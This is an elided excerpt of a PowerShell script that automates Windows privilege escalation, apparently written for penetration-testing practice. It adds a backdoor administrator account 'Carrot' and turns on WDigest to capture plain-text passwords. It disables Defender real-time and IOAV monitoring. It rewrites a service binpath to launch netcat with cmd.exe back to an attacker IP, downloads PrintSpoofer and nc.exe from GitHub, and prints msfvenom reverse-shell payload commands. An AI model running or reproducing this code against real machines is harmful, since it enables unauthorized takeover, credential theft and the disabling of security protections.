...
Script runs dangerous tools on target machine automatically, should not be used for OSCP
...

{
    ...
    if ($AttackerIP -and $LPORT)
    {
    	...
    	if ($user -contains "Domain Admins" -or "Administrators")
    		{
                ...
                write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Putting Carrot into administrators group"
                net localgroup "Administrators" /add Carrot
                sleep 2
                ...
                echo "Enabling WDigest for plain text passwords"
        ...
        elseif ($bit -eq "32-bit")
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]System is 32 bit"
        }
        else 
        {}
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Trying to disable Real Time Monitoring"
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableIOAVProtection $true
        $DRM = get-mppreference | select "DisableRealtimeMonitoring" >> invoke-winrm.txt
        $IOAV = get-mppreference | select "DisableIOAVProtection" >> invoke-winrm.txt
        if (select-string "true" invoke-winrm.txt)
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Real Time Monitoring IS disabled"
            sleep 3
        }
        elseif (select-string "false" invoke-winrm.txt)
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Real Time Monitoring NOT disabled"
            sleep 3
        }
        else{}
        echo ""
    	...
    	sleep 2
    	echo ""
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Seeing if .bak exists"
        Get-ChildItem *.bak* -Path C:* -Recurse >> invoke-winrm.txt
        echo ""
        sleep 2
    	...
    	if ($user -contains "Server Operators" -and $bit -contains "64-bit")
    	{
    		...
    		sc.exe config vss binpath-eq"C:\Windows\temp\nc64.exe -e cmd.exe $AttackerIP $LPORT"
    		echo ""
     	...
     	elseif ($user -eq "DNSAdmins" -and $bit -contains "32-bit")
     	{
     		write-host -foregroundcolor yellow -backgroundcolor black "`n[*]User is within DNSAdmins group exploiting now" >> invoke-winrm.txt
     		echo ""
    ...
    if ($user -eq "SeImpersonatePrivilege" -or "SeAssignPrimaryToken" -and $bit -contains "64-bit")
    {
    ...
    if ($user -eq "SeImpersonatePrivilege" -or "SeAssignPrimaryToken" -and $bit -contains "32-bit")
    {
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]$user has SeImpersonatePrivilege or SeAssignPrimaryToken, exploiting now" >> invoke-winrm.txt
        wget -usebasicparsing https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
        wget -usebasicparsing https://github.com/int0x33/nc.exe/raw/master/nc.exe -outfile C:\Windows\Temp\nc.exe
        write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on port $LPORT waiting 10 seconds ex (nc -lvnp $LPORT)"
        echo ""
    ...
    if (select-string "0x1" invoke-winrm.txt)
    {
        ...
        if ($bit -contains "64-bit")
        {
            ...
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/x64/shell/reverse_tcp LHOST-eq$AttackerIP LPORT-eq$LPORT > shell.msi"
            echo ""
        ...
        else
        {
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start webserver on port 80 on $AttackerIP"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Make file msfvenom -p windows/shell/reverse_tcp LHOST-eq$AttackerIP LPORT=$LPORT > shell.msi"
            echo ""
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Start nc listener on $LPORT"
            write-host -foregroundcolor yellow -backgroundcolor black "`n[*]Waiting 30 seconds"
            sleep 30
    ...
    Invoke-AllChecks >> invoke-winrm.txt
